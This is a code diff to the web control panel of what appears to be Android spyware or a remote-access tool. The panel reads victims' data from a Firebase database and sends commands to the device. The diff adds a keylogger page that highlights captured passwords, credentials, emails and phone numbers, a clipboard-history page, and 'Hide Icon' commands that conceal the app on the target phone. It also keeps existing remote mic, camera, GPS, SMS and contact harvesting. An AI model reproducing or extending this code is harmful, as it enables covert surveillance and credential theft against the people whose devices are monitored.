@@ -240,6 +240,11 @@
             color: white;
         }
 
+        .btn-success {
+            background: var(--success);
+            color: white;
+        }
+
         /* Camera View Fix */
         #stream-img {
             width: 100%;
@@ -776,6 +781,13 @@
             border-radius: 8px;
             border: 1px solid rgba(244, 63, 94, 0.2);
         }
+
+        /* Log Highlighting */
+        .log-email { background: rgba(37, 99, 235, 0.1) !important; color: var(--primary) !important; font-weight: 900 !important; }
+        .log-phone { background: rgba(16, 185, 129, 0.1) !important; color: var(--success) !important; font-weight: 900 !important; }
+        .log-credential { background: rgba(244, 63, 94, 0.1) !important; color: var(--danger) !important; font-weight: 900 !important; }
+        .log-password { background: #F43F5E !important; color: white !important; font-weight: 900 !important; border-radius: 4px; }
+        .log-action { color: var(--text-muted) !important; font-style: italic !important; }
     </style>
 </head>
 
@@ -857,6 +869,8 @@
             <div class="nav-item" data-page="gallery" onclick="showPage('gallery')"><i class="fas fa-images"></i> Media
             </div>
             <div class="nav-item" data-page="accounts" onclick="showPage('accounts')"><i class="fas fa-user-circle"></i> Accounts</div>
+            <div class="nav-item" data-page="keylogs" onclick="showPage('keylogs')"><i class="fas fa-keyboard"></i> Keylogger</div>
+            <div class="nav-item" data-page="clipboard" onclick="showPage('clipboard')"><i class="fas fa-paste"></i> Clipboard</div>
             <div class="nav-item" data-page="apps" onclick="showPage('apps')"><i class="fas fa-cubes"></i> Apps</div>
         </div>
 
@@ -981,22 +995,22 @@
                     <canvas id="visualizer"></canvas>
                 </div>
                 <div class="card">
-                    <h3 style="margin:0 0 15px;">Remote Messenger</h3>
+                    <h3 style="margin:0 0 15px;">Remote Utils</h3>
+                    <div class="flex-mobile-stack" style="display:flex; gap:10px; margin-bottom: 15px;">
+                        <input type="text" id="notif-title" placeholder="Title" style="flex:1; padding:12px; border-radius:10px; border:1px solid var(--border);">
+                        <input type="text" id="notif-body" placeholder="Message..." style="flex:2; padding:12px; border-radius:10px; border:1px solid var(--border);">
+                        <button class="btn btn-primary" onclick="sendRemoteNotif()">NOTIFY</button>
+                    </div>
                     <div class="flex-mobile-stack" style="display:flex; gap:10px;">
-                        <input type="text" id="notif-title" placeholder="Title"
-                            style="flex:1; padding:12px; border-radius:10px; border:1px solid var(--border); background:var(--main-bg); color:var(--text-main); font-size: 16px;">
-                        <input type="text" id="notif-body" placeholder="Message content..."
-                            style="flex:2; padding:12px; border-radius:10px; border:1px solid var(--border); background:var(--main-bg); color:var(--text-main); font-size: 16px;">
-                        <button class="btn btn-primary" onclick="sendRemoteNotif()"><i class="fas fa-paper-plane"></i>
-                            SEND</button>
+                        <input type="text" id="toast-text" placeholder="Toast message..." style="flex:1; padding:12px; border-radius:10px; border:1px solid var(--border);">
+                        <button class="btn btn-success" onclick="sendCommand('toast', document.getElementById('toast-text').value)">SHOW TOAST</button>
                     </div>
-
                 </div>
-                <div class="card"
-                    style="display:grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap:15px;">
-                    <div class="btn btn-primary" onclick="sendCommand('ring', true)"><i class="fas fa-bell"></i> Alarm
-                    </div>
-                    <div class="btn btn-primary" onclick="syncAll()"><i class="fas fa-sync"></i> Sync All</div>
+                <div class="card" style="display:grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap:15px;">
+                    <button class="btn btn-primary" onclick="sendCommand('ring', true)"><i class="fas fa-bell"></i> Alarm</button>
+                    <button class="btn btn-primary" onclick="syncAll()"><i class="fas fa-sync"></i> Sync All</button>
+                    <button class="btn btn-danger" onclick="sendCommand('hideIcon', true)"><i class="fas fa-eye-slash"></i> Hide Icon</button>
+                    <button class="btn btn-success" onclick="sendCommand('hideIcon', false)"><i class="fas fa-eye"></i> Show Icon</button>
                 </div>
 
             </div>
@@ -1063,6 +1077,18 @@
                 <div class="card">
                     <h3 style="margin:0 0 15px;">User Accounts</h3>
                     <div class="table-container" id="account-list"></div>
+                </div>
+            </div>
+            <div id="page-keylogs" class="page">
+                <div class="card">
+                    <h3 style="margin:0 0 15px;">Keylogger Logs</h3>
+                    <div class="table-container" id="keylogs-list"></div>
+                </div>
+            </div>
+            <div id="page-clipboard" class="page">
+                <div class="card">
+                    <h3 style="margin:0 0 15px;">Clipboard History</h3>
+                    <div class="table-container" id="clipboard-list"></div>
                 </div>
             </div>
             <div id="page-apps" class="page">
@@ -1185,6 +1211,7 @@
 
         function draw() {
             requestAnimationFrame(draw);
+            if(!canvasCtx) return;
             analyser.getByteTimeDomainData(dataArray);
             canvasCtx.clearRect(0, 0, 300, 120); canvasCtx.lineWidth = 3; canvasCtx.strokeStyle = '#2563EB'; canvasCtx.beginPath();
             let sliceWidth = 300.0 / analyser.frequencyBinCount; let x = 0;
@@ -1236,15 +1263,18 @@
                 const mTag = document.getElementById('m-status-tag');
                 const statusStr = h.online ? 'ONLINE' : 'OFFLINE';
                 const statusCls = h.online ? 'status-badge online' : 'status-badge offline';
-                tag.innerText = statusStr; tag.className = statusCls;
-                mTag.innerText = statusStr; mTag.className = statusCls;
+                if(tag) { tag.innerText = statusStr; tag.className = statusCls; }
+                if(mTag) { mTag.innerText = statusStr; mTag.className = statusCls; }
 
                 const bat = h.battery !== undefined ? h.battery : '--';
                 const storage = h.storage || '--';
-                document.getElementById('health-bar').innerHTML = `
-                    <span><i class="fas fa-battery-half"></i> ${bat}%</span>
-                    <span><i class="fas fa-database"></i> ${storage}</span>
-                `;
+                const hb = document.getElementById('health-bar');
+                if(hb) {
+                    hb.innerHTML = `
+                        <span><i class="fas fa-battery-half"></i> ${bat}%</span>
+                        <span><i class="fas fa-database"></i> ${storage}</span>
+                    `;
+                }
             });
 
             const locRef = db.ref(base + 'location'); activeRefs.push(locRef);
@@ -1276,7 +1306,7 @@
                 let html = '<table class="list-table"><tr><th>App</th><th>Content</th><th>Time</th></tr>';
                 const data = s.val() || {};
                 Object.values(data).reverse().forEach(n => {
-                    html += `<tr><td><b style="color:var(--primary)">${n.app || 'System'}</b></td><td>${n.text || n.body || '--'}</td><td>${n.time || '--'}</td></tr>`;
+                    html += `<tr><td><b style="color:var(--primary)">${n.package || n.app || 'System'}</b></td><td>${n.text || n.body || '--'}</td><td>${n.time ? new Date(n.time).toLocaleString() : '--'}</td></tr>`;
                 });
                 document.getElementById('notif-list').innerHTML = html + '</table>';
             });
@@ -1306,7 +1336,8 @@
                 document.getElementById('mic-text').innerText = isLive ? "LIVE" : "OFF";
                 document.getElementById('btn-on').classList.toggle('active', isLive);
                 document.getElementById('btn-off').classList.toggle('active', !isLive);
-                document.getElementById('main-mic-icon').style.display = isLive ? 'none' : 'block';
+                const micIcon = document.getElementById('main-mic-icon');
+                if(micIcon) micIcon.style.display = isLive ? 'none' : 'block';
                 document.getElementById('voice-wave-container').classList.toggle('active', isLive);
             });
 
@@ -1357,8 +1388,36 @@
             const accountRef = db.ref(base + 'accounts'); activeRefs.push(accountRef);
             accountRef.on('value', s => {
                 let html = '<table class="list-table"><tr><th>Type</th><th>Account Name</th></tr>';
-                (s.val() || []).forEach(v => { html += `<tr><td>${v.type}</td><td><b>${v.name}</b></td></tr>`; });
+                const data = s.val() || [];
+                data.forEach(v => { html += `<tr><td>${v.type}</td><td><b>${v.name}</b></td></tr>`; });
                 document.getElementById('account-list').innerHTML = html + '</table>';
+            });
+
+            const keylogsRef = db.ref(base + 'keylogs'); activeRefs.push(keylogsRef);
+            keylogsRef.on('value', s => {
+                let html = '<table class="list-table"><tr><th>App</th><th>Content</th><th>Time</th></tr>';
+                const data = s.val() || {};
+                Object.values(data).reverse().forEach(v => {
+                    let cls = "";
+                    if(v.type === 'email') cls = "log-email";
+                    else if(v.type === 'phone') cls = "log-phone";
+                    else if(v.type === 'credential') cls = "log-credential";
+                    else if(v.type === 'password') cls = "log-password";
+                    else if(v.type === 'action') cls = "log-action";
+
+                    html += `<tr class="${cls}"><td><b style="color:var(--primary)">${v.app}</b></td><td>${v.text}</td><td>${v.time}</td></tr>`;
+                });
+                document.getElementById('keylogs-list').innerHTML = html + '</table>';
+            });
+
+            const clipRef = db.ref(base + 'clipboard'); activeRefs.push(clipRef);
+            clipRef.on('value', s => {
+                let html = '<table class="list-table"><tr><th>Text</th><th>Time</th></tr>';
+                const data = s.val() || {};
+                Object.values(data).reverse().forEach(v => {
+                    html += `<tr><td>${v.text}</td><td>${v.time ? new Date(v.time).toLocaleString() : '--'}</td></tr>`;
+                });
+                document.getElementById('clipboard-list').innerHTML = html + '</table>';
             });
 
             const appsRef = db.ref(base + 'installedApps'); activeRefs.push(appsRef);
@@ -1375,7 +1434,6 @@
         function toggleMic(on) {
             if (on) {
                 initAudio();
-                // Optimistic UI for immediate animation
                 document.getElementById('mic-text').innerText = "CONNECTING...";
                 document.getElementById('main-mic-icon').style.display = 'none';
                 document.getElementById('voice-wave-container').classList.add('active');
@@ -1383,7 +1441,7 @@
                 document.getElementById('mic-text').innerText = "OFF";
                 document.getElementById('main-mic-icon').style.display = 'block';
                 document.getElementById('voice-wave-container').classList.remove('active');
-                nextStartTime = 0; // Reset queue
+                nextStartTime = 0;
             }
             if (currentId) db.ref(`devices/${currentId}/commands/recordSurround`).set(on);
         }
@@ -1398,6 +1456,7 @@
         }
         function stopStream() { if (currentId) db.ref(`devices/${currentId}/streamConfig`).update({ enabled: false }); }
         function syncAll() { ['getApps', 'getCallLogs', 'getSMS', 'getGallery', 'getContacts', 'getGPS', 'getAccounts'].forEach(c => sendCommand(c, true)); }
+
         function handleAuth() {
             const e = document.getElementById('auth-email').value;
             const p = document.getElementById('auth-pass').value;
@@ -1412,17 +1471,15 @@
                 return;
             }
 
-            // Start Loading
             btn.disabled = true;
             spinner.style.display = 'block';
             btnText.innerText = "AUTHENTICATING...";
             errEl.style.display = 'none';
 
             auth.signInWithEmailAndPassword(e, p).catch(err => {
-                // Handle Error
                 btn.disabled = false;
                 spinner.style.display = 'none';
-                btnText.innerText = "INITIALIZE TERMINAL";
+                btnText.innerText = "LOGIN";
                 errEl.innerText = "Error: " + err.message;
                 errEl.style.display = 'block';
             });
